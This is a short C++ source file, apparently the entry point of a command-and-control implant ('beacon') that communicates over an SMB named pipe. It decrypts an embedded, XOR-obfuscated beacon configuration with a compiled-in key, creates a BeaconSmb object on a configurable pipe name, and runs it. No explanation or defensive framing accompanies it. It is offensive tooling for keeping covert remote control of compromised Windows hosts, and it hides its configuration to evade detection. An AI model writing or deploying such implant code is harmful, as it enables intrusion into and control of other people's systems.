#include "BeaconSmb.hpp"

#include "cryptDef.hpp"


using namespace std;


int main(int argc, char* argv[])
{	
	std::string pipeName = "mynamedpipe";
	if(argc > 1)
		pipeName = argv[1];

	std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
    std::string keyConfig(std::begin(_KeyConfig_), std::end(_KeyConfig_));
    XOR(configDecrypt, keyConfig);

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconSmb>(configDecrypt, pipeName);

	beacon->run();
}